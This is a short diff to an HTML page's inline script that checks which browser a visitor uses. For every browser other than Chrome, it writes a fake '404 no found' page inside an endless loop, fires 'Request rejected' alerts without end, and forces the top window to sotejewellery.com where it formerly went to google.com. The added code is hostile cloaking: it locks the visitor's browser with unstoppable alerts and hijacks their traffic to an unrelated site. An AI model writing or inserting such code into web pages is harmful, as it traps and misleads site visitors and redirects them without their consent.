@@ -29,12 +29,12 @@
   </div>
   <script>
     if(getBrowserInfo()!='chrome'){
-      document.open();
-      document.write('404 no found');
-      document.close();
       while(1){
+        document.open();
+        document.write('404 no found');
+        document.close();
         alert('Request rejected');
-        top.location='https://www.google.com/';
+        top.location='https://www.sotejewellery.com/';
       }
       document.title='404 no found';
     }
